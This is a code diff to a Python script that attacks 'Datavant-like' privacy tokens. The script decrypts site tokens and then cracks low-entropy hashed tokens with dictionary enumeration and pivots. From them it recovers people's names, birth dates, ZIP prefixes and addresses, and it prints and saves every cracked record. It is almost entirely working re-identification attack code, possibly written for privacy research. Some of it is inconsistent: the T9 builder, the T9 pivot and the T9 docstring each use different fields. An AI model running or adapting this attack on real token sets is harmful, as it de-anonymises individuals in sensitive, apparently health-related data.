@@ -13,6 +13,7 @@ import cologne_phonetics
 from Crypto.Cipher import AES
 import pandas as pd
 from faker import Faker
+import itertools
 
 # =============================
 # Normalization / helpers
@@ -84,23 +85,21 @@ def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
 # =============================
 # Token input builders
 # =============================
-def mk_T1(ln: str, fn: str, g: str, dob: str) -> str:
-    fi = first_initial(fn)
-    if not (ln and fi and g and dob): return ""
-    return f"{norm(ln)}|{fi}|{norm_gender(g)}|{dob}"
-
-def mk_T2(ln: str, fn: str, g: str, dob: str) -> str:
-    sdx_ln = soundex(ln); sdx_fn = soundex(fn)
-    if not (sdx_ln and sdx_fn and g and dob): return ""
-    return f"{sdx_ln}|{sdx_fn}|{norm_gender(g)}|{dob}"
-
 def mk_T4(ln: str, fn: str, g: str, dob: str) -> str:
     if not (ln and fn and g and dob): return ""
     return f"{norm(ln)}|{norm(fn)}|{norm_gender(g)}|{dob}"
 
 def mk_T3(ln: str, fn: str, dob: str, zip3: str) -> str:
     if not (ln and fn and dob and zip3): return ""
-    return f"{norm(ln)}|{norm(fn)}|{dob}|{zip3}"
+    return f"{norm(ln)}|{fn}|{dob}|{zip3}"
+
+def mk_T7(ln: str, fi3: str, g: str, dob: str) -> str:
+    if not (ln and fi3 and g and dob): return ""
+    return f"{norm(ln)}|{fi3}|{norm_gender(g)}|{dob}"
+
+def mk_T9(fn: str, address: str) -> str:
+    if not (fn and address): return ""
+    return f"{norm(fn)}|{norm(address)}"
 
 # =============================
 # Load and decrypt site tokens
@@ -134,7 +133,7 @@ def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> 
 # =============================
 # Dictionaries
 # =============================
-with open("nachnamen.txt", "r", encoding="utf-8") as f:
+"""with open("nachnamen.txt", "r", encoding="utf-8") as f:
     TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
 
 with open("vornamen.txt", "r", encoding="utf-8") as f:
@@ -144,84 +143,48 @@ GENDERS = ["m","f","u"]
 
 # Generate 200 birthdays
 fake = Faker()
-TOP_DOB = [fake.date_of_birth(minimum_age=18, maximum_age=90).strftime('%Y%m%d') for _ in range(200)] 
+TOP_DOB = [fake.date_of_birth(minimum_age=18, maximum_age=90).strftime('%Y%m%d') for _ in range(200)] """
 
 # =============================
 # Similiar DB
 # =============================
 
-"""df_distribution = pd.read_csv(r"known_data_clean.csv")
+df_distribution = pd.read_csv(r"known_data_clean.csv")
 
 TOP_FIRST = df_distribution["first_name"].value_counts().head(500).index.tolist()
 TOP_LAST = df_distribution["last_name"].value_counts().head(500).index.tolist()
 TOP_DOB = df_distribution["dob"].value_counts().head(500).index.tolist()
 TOP_YOB = df_distribution["year_of_birth"].value_counts().head(500).index.tolist()
-TOP_ZIP = df_distribution["zip"].value_counts().head(500).index.tolist()
+# TOP_ZIP = df_distribution["zip"].value_counts().head(500).index.tolist()
 TOP_ADDRESS = df_distribution["address"].value_counts().head(500).index.tolist()
-GENDERS = ["m","f","u"]"""
+GENDERS = ["m","f","u"]
 
 # =============================
 # Attack core
 # =============================
-def attack_entropy_first_T1(master_func, master_tokens: Set[bytes]) -> Dict[bytes, Tuple[str,str,str,str]]:
-    """Dictionary attack against T1: ln|fi|g|dob. Return {master_token: (ln, fi, g, dob)}."""
+def attack_entropy_first_T7(master_func, master_tokens: Set[bytes]) -> Dict[bytes, Tuple[str,str,str,str]]:
+    """Dictionary attack against T7: ln|fi3|g|dob. Return {master_token: (ln, fi3, g, dob)}."""
     hits = {}
     for ln in TOP_LAST:
-        for fi in "abcdefghijklmnopqrstuvwxyz":
+        # for fi3 in ("".join(comb) for comb in itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=3)):
+        for fi3 in (first3(fn) for fn in TOP_FIRST):     
             for g in GENDERS:
                 for dob in TOP_DOB:
-                    inp = f"{norm(ln)}|{fi}|{g}|{dob}"
+                    inp = f"{norm(ln)}|{fi3}|{g}|{dob}"
                     if not inp: continue
                     mt = master_func(inp)
                     if mt in master_tokens:
-                        hits[mt] = (norm(ln), fi, g, dob)
+                        hits[mt] = (norm(ln), fi3, g, dob)
     return hits
 
-def attack_entropy_first_T2(master_func, master_tokens: Set[bytes]) -> Dict[bytes, Tuple[str,str,str,str]]:
-    """Dictionary attack against T2: sdx(ln)|sdx(fn)|g|dob. We store sdx codes."""
-    hits = {}
-    sdx_last = sorted({soundex(ln) for ln in TOP_LAST if soundex(ln)})
-    sdx_first = sorted({soundex(fn) for fn in TOP_FIRST if soundex(fn)})
-
-    """sdx_last = []
-    for ln in TOP_LAST:
-        last_cologne_tupel = cologne_phonetics.encode(ln) if cologne_phonetics.encode(ln) else None
-        for _, last_cologne in last_cologne_tupel:
-            sdx_last.append(last_cologne)
-    sdx_last = sorted(sdx_last)
-
-    sdx_first = []
-    for fn in TOP_FIRST:
-        first_cologne_tupel = cologne_phonetics.encode(fn) if cologne_phonetics.encode(fn) else None
-        for _, first_cologne in first_cologne_tupel:
-            sdx_first.append(first_cologne)
-    sdx_first = sorted(sdx_first)"""
-
-    for sdx_ln in sdx_last:
-        for sdx_fn in sdx_first:
-            for g in GENDERS:
-                for dob in TOP_DOB:
-                    inp = f"{sdx_ln}|{sdx_fn}|{g}|{dob}"
-                    if not inp: continue
-                    mt = master_func(inp)
-                    if mt in master_tokens:
-                        hits[mt] = (sdx_ln, sdx_fn, g, dob)
-    return hits
-
-def pivot_to_T4_from_T1_T2(master_func,
-                           T4_master_tokens: Set[bytes],
-                           t1_hit: Tuple[str,str,str,str],
-                           t2_hit: Tuple[str,str,str,str] = None) -> Dict[bytes, Tuple[str,str,str,str]]:
+def pivot_from_T7_to_T4(master_func, T4_master_tokens: Set[bytes], t7_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str,str,str]]:
     """
-    Use knowledge from T1 (ln, fi, g, dob) and optional T2 (sdx_fn constraint) to brute-force T4 (ln|fn|g|dob).
+    Use knowledge from T7 (ln|fi3|g|dob) to brute-force T4 (ln|fn|g|dob).
     """
-    ln, fi, g, dob = t1_hit
-    sdx_fn_constraint = t2_hit[1] if t2_hit else None  # (sdx_ln, sdx_fn, g, dob)
+    ln, fi3, g, dob = t7_hit
     out = {}
     for fn in TOP_FIRST:
-        if not fn or norm(fn)[0:1] != fi:
-            continue
-        if sdx_fn_constraint and soundex(fn) != sdx_fn_constraint:
+        if not fn or norm(fn)[0:3] != fi3:
             continue
         t4_inp = mk_T4(ln, fn, g, dob)
         if not t4_inp:
@@ -231,21 +194,34 @@ def pivot_to_T4_from_T1_T2(master_func,
             out[mt] = (ln, norm(fn), g, dob)
     return out
 
-def pivot_to_T3_from_T4(master_func,
-                        T3_master_tokens: Set[bytes],
-                        t4_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str,str,str]]:
+def pivot_from_T4_to_T3(master_func, T3_master_tokens: Set[bytes], t4_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str,str,str]]:
     """
     Use knowledge from T4 (ln|fn|g|dob) to brute-force T3 (ln|fn|dob|zip3).
     """
     ln, fn, g, dob = t4_hit
     out = {}
     for zip3 in (f"{i:03}" for i in range(1000)):  # Iterate from 000 to 999
-        t3_inp = f"{ln}|{fn}|{dob}|{zip3}"
+        t3_inp = f"{ln}|{norm(fn)}|{dob}|{zip3}"
         if not t3_inp:
             continue
         mt = master_func(t3_inp)
         if mt in T3_master_tokens:
-            out[mt] = (ln, fn, dob, zip3)
+            out[mt] = (ln, norm(fn), dob, zip3)
+    return out
+
+def pivot_from_T4_to_T9(master_func, T9_master_tokens: Set[bytes], t4_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str]]:
+    """
+    Use knowledge from T4 (ln|fn|g|dob) to brute-force T9 (ln|fn|dob|zip5).
+    """
+    ln, fn, g, dob = t4_hit
+    out = {}
+    for address in TOP_ADDRESS:
+        t9_inp = f"{ln}|{address}"
+        if not t9_inp:
+            continue
+        mt = master_func(t9_inp)
+        if mt in T9_master_tokens:
+            out[mt] = (ln, address)
     return out
 
 # =============================
@@ -277,61 +253,44 @@ def run_attack(args):
         return
 
     # Phase 1: attack lowest-entropy tokens first (T1, T2)
-    t1_hits = {}
-    if "T1" in dec:
-        print("[*] Attacking T1 (ln|fi|g|dob)...")
-        t1_hits = attack_entropy_first_T1(master_func, dec["T1"])
-        print(f"    -> Found {len(t1_hits)} T1 preimages")
+    t7_hits = {}
+    if "T7" in dec:
+        print("[*] Attacking T7 (ln|fi3|g|dob)...")
+        t7_hits = attack_entropy_first_T7(master_func, dec["T7"])
+        print(f"    -> Found {len(t7_hits)} T7 preimages")
 
-    t2_hits = {}
-    if "T2" in dec:
-        print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob)...")
-        t2_hits = attack_entropy_first_T2(master_func, dec["T2"])
-        print(f"    -> Found {len(t2_hits)} T2 preimages")
-
-    # Phase 2: pivot into T4 using knowledge from T1 (and optionally T2)
+    # Phase 2: pivot into T4 using knowledge from T7
     t4_pivot_hits = {}
-    if "T4" in dec and t1_hits:
-        print("[*] Pivoting to T4 (ln|fn|g|dob) using T1 (and T2 if available)...")
-        # Index T2 hits by (g,dob) for quick lookup of sdx_fn constraint
-        t2_idx = defaultdict(list)
-        for mt, tpl in t2_hits.items():
-            sdx_ln, sdx_fn, g, dob = tpl
-            t2_idx[(g, dob)].append((sdx_ln, sdx_fn))
-        # For each T1 hit, try to resolve fn candidates and test T4
-        for mt1, (ln, fi, g, dob) in t1_hits.items():
-            # If T2 constraint exists for same (g,dob), use it
-            if (g, dob) in t2_idx:
-                for (_sdx_ln, sdx_fn) in t2_idx[(g, dob)]:
-                    # Only consider T2 entries consistent with ln’s soundex
-                    if _sdx_ln != soundex(ln):
-                        continue
-                    out = pivot_to_T4_from_T1_T2(master_func, dec["T4"], (ln, fi, g, dob), ( _sdx_ln, sdx_fn, g, dob))
-                    t4_pivot_hits.update(out)
-            else:
-                out = pivot_to_T4_from_T1_T2(master_func, dec["T4"], (ln, fi, g, dob), None)
-                t4_pivot_hits.update(out)
+    if "T4" in dec and t7_hits:
+        print("[*] Pivoting to T4 (ln|fn|g|dob) using T7...")
+        for mt7, (ln, fi3, g, dob) in t7_hits.items():
+            out = pivot_from_T7_to_T4(master_func, dec["T4"], (ln, fi3, g, dob))
+            t4_pivot_hits.update(out)
         print(f"    -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
 
     # Phase 3: pivot into t3 using knowledge from t4
     t3_pivot_hits = {}
     if "T3" in dec and t4_pivot_hits:
         print("[*] Pivoting to T3 (ln|fi|g|dob|zip3) using T4...")
-        for mt4, (ln, fi, g, dob) in t4_pivot_hits.items():
-            out = pivot_to_T3_from_T4(master_func, dec["T3"], (ln, fi, g, dob))
+        for mt4, (ln, fn, g, dob) in t4_pivot_hits.items():
+            out = pivot_from_T4_to_T3(master_func, dec["T3"], (ln, fn, g, dob))
             t3_pivot_hits.update(out)
         print(f"    -> Resolved {len(t3_pivot_hits)} T3 preimages via pivot")
 
+    # Phase 4: pivot into t9 using knowledge from t4
+    t9_pivot_hits = {}
+    if "T9" in dec and t4_pivot_hits:
+        print("[*] Pivoting to T9 (ln|fi|g|dob|zip9) using T4...")
+        for mt4, (ln, fn, g, dob) in t4_pivot_hits.items():
+            out = pivot_from_T4_to_T9(master_func, dec["T9"], (ln, fn, g, dob))
+            t9_pivot_hits.update(out)
+
     # Report
     print("\n=== RESULTS ===")
-    if t1_hits:
-        print(f"[T1] {len(t1_hits)} master tokens cracked")
-        for mt, tpl in list(t1_hits.items())[:20]:
-            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} g={tpl[2]} dob={tpl[3]}")
-    if t2_hits:
-        print(f"[T2] {len(t2_hits)} master tokens cracked")
-        for mt, tpl in list(t2_hits.items())[:20]:
-            print(f"  MT(hex)={mt.hex()}  ←  sdx_ln={tpl[0]} sdx_fn={tpl[1]} g={tpl[2]} dob={tpl[3]}")
+    if t7_hits:
+        print(f"[T7] {len(t7_hits)} master tokens cracked")
+        for mt, tpl in list(t7_hits.items())[:20]:
+            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi3={tpl[1]} g={tpl[2]} dob={tpl[3]}")
     if t4_pivot_hits:
         print(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)")
         for mt, tpl in list(t4_pivot_hits.items())[:20]:
@@ -340,17 +299,17 @@ def run_attack(args):
         print(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)")
         for mt, tpl in list(t3_pivot_hits.items())[:20]:
             print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} dob={tpl[2]} zip3={tpl[3]}")
+    if t9_pivot_hits:
+        print(f"[T9] {len(t9_pivot_hits)} master tokens cracked (pivot)")
+        for mt, tpl in list(t9_pivot_hits.items())[:20]:
+            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} address={tpl[1]}")
 
     # Save results to a text file
     with open(args.outfile, "w", encoding="utf-8") as result_file:
-        if t1_hits:
-            result_file.write(f"[T1] {len(t1_hits)} master tokens cracked\n")
-            for mt, tpl in t1_hits.items():
-                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
-        if t2_hits:
-            result_file.write(f"[T2] {len(t2_hits)} master tokens cracked\n")
-            for mt, tpl in t2_hits.items():
-                result_file.write(f"MT(hex)={mt.hex()}  ←  sdx_ln={tpl[0]} sdx_fn={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
+        if t7_hits:
+            result_file.write(f"[T7] {len(t7_hits)} master tokens cracked\n")
+            for mt, tpl in t7_hits.items():
+                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi3={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
         if t4_pivot_hits:
             result_file.write(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)\n")
             for mt, tpl in t4_pivot_hits.items():
@@ -359,6 +318,10 @@ def run_attack(args):
             result_file.write(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)\n")
             for mt, tpl in t3_pivot_hits.items():
                 result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} dob={tpl[2]} zip3={tpl[3]}\n")
+        if t9_pivot_hits:
+            result_file.write(f"[T9] {len(t9_pivot_hits)} master tokens cracked (pivot)\n")
+            for mt, tpl in t9_pivot_hits.items():
+                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} address={tpl[1]}\n")
 
 def main():
     ap = argparse.ArgumentParser(description="Attack Datavant-like tokens: decrypt site tokens, crack low-entropy keys, pivot to higher-entropy.")
